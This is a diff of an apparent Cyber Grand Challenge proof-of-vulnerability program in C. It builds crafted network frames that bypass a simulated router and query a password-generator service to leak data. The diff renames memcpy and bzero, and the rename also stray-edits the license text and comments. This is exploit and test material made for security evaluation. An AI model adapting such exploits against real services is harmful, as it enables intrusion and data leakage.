@@ -4,7 +4,7 @@ Author: Joe Rogers <joe@cromulence.com>
 
 Copyright (c) 2015 Cromulence LLC
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
+Permission is hereby granted, __free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -30,14 +30,14 @@ THE SOFTWARE.
 
 unsigned char decoded_magic_page[500];
 
-void memcpy(unsigned char *Dst, unsigned char *Src, uint32_t Len) {
+void __memcpy(unsigned char *Dst, unsigned char *Src, uint32_t Len) {
 	uint32_t i;
 	for (i = 0; i < Len; i++) {
 		Dst[i] = Src[i];
 	}
 }
 
-void bzero(unsigned char *Buf, uint32_t Len) {
+void __bzero(unsigned char *Buf, uint32_t Len) {
 	uint32_t i;
 	for (i = 0; i < Len; i++) {
 		Buf[i] = 0;
@@ -165,7 +165,7 @@ uint8_t BuildL2Frame(uint16_t L2Dst, uint16_t L2Src, uint8_t Vlan, unsigned char
 
 	Sum = Checksum(Frame);
 
-	memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+pL3->Len, (unsigned char *)&Sum, 4);
+	__memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+pL3->Len, (unsigned char *)&Sum, 4);
 
 	return(L2_HDR_LEN+pL2->Len);
 }
@@ -189,7 +189,7 @@ uint8_t BuildL4Segment(unsigned char L4Dst, unsigned char L4Src, unsigned char *
 	pL4->Dst = L4Dst;
 	pL4->Src = L4Src;
 	pL4->Len = DataLen;
-	memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+L4_HDR_LEN, Data, DataLen);
+	__memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+L4_HDR_LEN, Data, DataLen);
 
 	return(L4_HDR_LEN+pL4->Len);
 
@@ -215,7 +215,7 @@ uint8_t BuildAdpRequest(uint32_t L3AdpAddr, uint16_t L2Src, uint8_t Vlan, unsign
 
 	Sum = Checksum(Frame);
 
-	memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
+	__memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
 
 	return(L2_HDR_LEN+L2_ADJ_LEN+L2_FTR_LEN);
 
@@ -241,7 +241,7 @@ uint8_t BuildAdpResponse(uint32_t L3AdpAddr, uint32_t L2AdpAddr, uint16_t L2Dst,
 
 	Sum = Checksum(Frame);
 
-	memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
+	__memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
 
 	return(L2_HDR_LEN+L2_ADJ_LEN+L2_FTR_LEN);
 
@@ -294,7 +294,7 @@ int main(void) {
 	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);
 
 	// send a normally routed packet to build the L2 CAM tables in cb_switch
-	bzero(Frame, MAX_FRAME_SIZE);
+	__bzero(Frame, MAX_FRAME_SIZE);
 	BuildL4Segment(ECHO_L4ADDR, 0x41, (unsigned char *)"AA", 2, Frame);
 	BuildL3Packet(0x0a010202, 0x0a010102, Frame);
 	EchoLen = BuildL2Frame(0x0001, 0x1000, 0, Frame);
@@ -302,31 +302,31 @@ int main(void) {
 
 	// receive the ADP request that the router will generate when trying
 	// to send back the echo response packet
-	bzero(Frame, MAX_FRAME_SIZE);
+	__bzero(Frame, MAX_FRAME_SIZE);
 	ReadBytes(STDIN, Frame, 19);
 	
 	// answer the ADP request 
-	bzero(Frame, MAX_FRAME_SIZE);
+	__bzero(Frame, MAX_FRAME_SIZE);
 	Len = BuildAdpResponse(0x0a010102, 0x1000, 0x0001, 0x1000, 0, Frame);
 	SendBytes(STDOUT, Frame, Len);
 
-	// read the echo response
-	bzero(Frame, MAX_FRAME_SIZE);
+	// __read the echo response
+	__bzero(Frame, MAX_FRAME_SIZE);
 	ReadBytes(STDIN, Frame, EchoLen);
 
 	for (i = 0; i < 4; i++) {
 		// send a pwdgen request to cb_3 bypassing the router
 		// use src L2 addr with 00 for last two bits
-		bzero(Frame, MAX_FRAME_SIZE);
+		__bzero(Frame, MAX_FRAME_SIZE);
 		BuildL4Segment(PWDGEN_L4ADDR, 0x41, (unsigned char *)"AA", 2, Frame);
 		BuildL3Packet(0x0a010202, 0x0a010102, Frame);
 		Len = BuildL2Frame(0xaaaa, 0x1000+i, 2, Frame);
 		SendBytes(STDOUT, Frame, Len);
 	
 		// receive the pwdgen response
-		// read in the L2hdr first
+		// __read in the L2hdr first
 		ReadBytes(STDIN, Frame, L2_HDR_LEN);
-		// read in the rest of the Frame
+		// __read in the rest of the Frame
 		ReadBytes(STDIN, Frame+L2_HDR_LEN, pL2->Len);
 	
 		// Parse the pwdgen response
